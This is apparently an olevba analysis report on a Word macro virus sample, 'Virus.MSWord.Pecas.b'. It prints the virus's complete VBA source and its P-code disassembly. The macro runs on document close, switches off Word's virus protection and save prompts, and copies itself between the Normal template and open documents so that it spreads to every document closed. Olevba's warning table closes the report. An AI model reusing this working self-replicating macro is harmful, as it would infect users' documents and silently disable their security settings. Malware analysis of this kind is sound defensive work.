olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pecas.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pecas.cls 
in file: ./Virus.MSWord.Pecas.b - OLE stream: 'Macros/VBA/Pecas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'by morris "vegueta"
'pequitas es mi novia
'mi viejo amigo " goto"
'd1
'este virus tiene un bug en mi siguiente version lo solucionare
'regided by jaNNis specially for LLU

Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
Options.ConfirmConversions = (1 - 1)
Set plan = NormalTemplate.VBProject.VBComponents.Item(1)
Set activ = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = NormalTemplate.VBProject.VBComponents(1).CodeModule
bandera = 0
paso2:
cont = activ.CodeModule.countoflines
cont1 = plan.CodeModule.countoflines
var = plan.Name
If var = "Pecas" Then
  If activ.Name <> "Pecas" Then
   activ.CodeModule.DeleteLines 1, cont
    activ.CodeModule.InsertLines 1, temp.lines(1, cont1)
    activ.Name = plan.Name
      If bandera = 0 Then
      If InStr(1, ActiveDocument.Name, "Document") = 0 Then
        Selection.TypeText " Un es ftufdtuyf. "
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       Else
       ActiveDocument.Saved = True
      End If
      End If
    End If
End If
bandera = bandera + 1
If bandera > 1 Then
Application.ScreenUpdating = False
Exit Sub
End If
Set activ = NormalTemplate.VBProject.VBComponents.Item(1)
Set plan = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = ActiveDocument.VBProject.VBComponents(1).CodeModule

GoTo paso2
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Pecas.b
' ===============================================================================
' Module streams:
' Macros/VBA/Pecas - 3268 bytes
' Line #0:
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0013 "by morris "vegueta""
' Line #3:
' 	QuoteRem 0x0000 0x0014 "pequitas es mi novia"
' Line #4:
' 	QuoteRem 0x0000 0x0016 "mi viejo amigo " goto""
' Line #5:
' 	QuoteRem 0x0000 0x0002 "d1"
' Line #6:
' 	QuoteRem 0x0000 0x003E "este virus tiene un bug en mi siguiente version lo solucionare"
' Line #7:
' 	QuoteRem 0x0000 0x0023 "regided by jaNNis specially for LLU"
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub Document_Close())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set plan 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activ 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set temp 
' Line #18:
' 	LitDI2 0x0000 
' 	St bandera 
' Line #19:
' 	Label paso2 
' Line #20:
' 	Ld activ 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cont 
' Line #21:
' 	Ld plan 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cont1 
' Line #22:
' 	Ld plan 
' 	MemLd New 
' 	St var 
' Line #23:
' 	Ld var 
' 	LitStr 0x0005 "Pecas"
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld activ 
' 	MemLd New 
' 	LitStr 0x0005 "Pecas"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld cont 
' 	Ld activ 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld cont1 
' 	Ld temp 
' 	ArgsMemLd lines 0x0002 
' 	Ld activ 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	Ld plan 
' 	MemLd New 
' 	Ld activ 
' 	MemSt New 
' Line #28:
' 	Ld bandera 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitStr 0x0012 " Un es ftufdtuyf. "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld bandera 
' 	LitDI2 0x0001 
' 	Add 
' 	St bandera 
' Line #39:
' 	Ld bandera 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #41:
' 	ExitSub 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activ 
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set plan 
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set temp 
' Line #46:
' Line #47:
' 	GoTo paso2 
' Line #48:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

